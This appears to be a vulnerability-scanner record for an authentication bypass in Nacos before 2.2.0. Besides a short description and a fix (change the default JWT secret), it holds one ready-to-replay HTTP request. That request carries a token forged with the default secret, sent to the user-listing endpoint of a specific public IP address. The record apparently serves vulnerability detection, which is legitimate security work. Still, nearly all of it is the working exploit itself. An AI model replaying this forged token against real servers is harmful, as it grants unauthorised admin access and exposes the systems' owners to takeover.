info.name: Nacos < 2.2.0 - Authentication Bypass
info.author: Esonhugh
info.description: The authentication function of Nacos is can be bypass through default JWT secret.
info.remediation: Change value of jwt secret in the configurations

req_resp.req:
GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1
HOST: 47.95.142.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
